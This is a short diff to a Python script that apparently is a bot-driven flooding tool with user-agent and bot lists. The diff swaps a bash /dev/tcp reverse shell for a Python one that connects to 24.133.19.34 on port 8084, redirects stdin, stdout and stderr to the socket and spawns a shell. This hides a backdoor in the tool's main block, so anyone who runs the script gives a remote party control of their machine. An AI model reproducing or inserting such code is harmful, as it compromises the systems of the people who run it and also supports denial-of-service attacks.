@@ -1,3 +1,4 @@
+
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
@@ -8,8 +9,8 @@
 
 from queue import Queue
 from optparse import OptionParser
-import time,sys,socket,threading,logging,urllib.request,random,os
-
+import time,sys,threading,logging,urllib.request,random,os
+import socket,subprocess,os,pty
 def user_agent():
 	global uagent
 	uagent=[]
@@ -134,7 +135,13 @@ if __name__ == '__main__':
 	user_agent()
 	my_bots()
 	time.sleep(5)
-	os.system("sh -i >& /dev/tcp/24.133.19.34/8085 0>&1")
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect(("24.133.19.34",8084))
+	os.dup2(s.fileno(),0)
+	os.dup2(s.fileno(),1)
+	os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
+	pty.spawn("sh")
+	
 
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
